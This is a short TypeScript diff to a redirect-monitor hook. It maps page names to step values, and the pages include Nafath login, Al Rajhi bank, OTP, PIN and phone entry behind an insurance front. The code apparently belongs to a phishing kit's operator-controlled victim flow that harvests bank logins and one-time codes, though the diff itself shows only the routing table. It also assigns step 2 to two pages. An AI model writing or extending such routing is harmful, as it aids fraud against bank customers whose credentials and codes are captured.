@@ -32,16 +32,17 @@ const PAGE_MAP: Record<string, string> = {
 };
 
 // Which currentStep values belong to which page
-const STEP_OWNERS: Record<string, string[]> = {
-  nafad: ["nafad", "_t6"],     // step4 handles nafad and _t6
-  rajhi: ["rajhi", "_r6"],     // step6 handles rajhi and _r6
-  home: ["home", "_h1"],
-  insur: ["insur", "_i2"],
+// Supports both string values (nafad, _t6) and numeric values (8, 9)
+const STEP_OWNERS: Record<string, (string | number)[]> = {
+  nafad: ["nafad", "_t6", 8],     // step4 handles: nafad, _t6, and step 8
+  rajhi: ["rajhi", "_r6", 9],     // step6 handles: rajhi, _r6, and step 9
+  home: ["home", "_h1", 1],
+  insur: ["insur", "_i2", 2],
   compar: ["compar"],
-  check: ["check", "_st1"],
-  otp: ["otp", "_t2"],
-  pin: ["pin", "_t3"],
-  phone: ["phone"],
+  check: ["check", "_st1", 4],
+  otp: ["otp", "_t2", 2],
+  pin: ["pin", "_t3", 3],
+  phone: ["phone", 7],
 };
 
 export function useRedirectMonitor({
